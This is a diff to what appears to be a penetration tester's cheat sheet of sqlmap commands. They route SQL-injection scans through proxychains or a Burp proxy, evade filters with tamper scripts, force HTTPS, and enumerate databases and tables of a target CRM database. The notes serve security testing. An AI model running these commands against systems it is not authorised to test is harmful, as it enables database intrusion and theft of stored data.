@@ -27,3 +27,13 @@ proxychains sqlmap -r request2.req --level 2 --risk 1 -p id --tamper="space2comm
 
 proxychains sqlmap -r reqsqlmap.req --dbs
 proxychains sqlmap -r reqsqlmap.req  -D "db_crm" --tables 
+
+==============================================================================
+[+] SQLmap fix connection or force https
+==============================================================================
+# --force-ssl
+sqlmap -r req.req --force-ssl
+
+# view on burp suite
+sqlmap -r req.req --random-agent --proxy="https://192.168.20.43:8090" --force-ssl
+
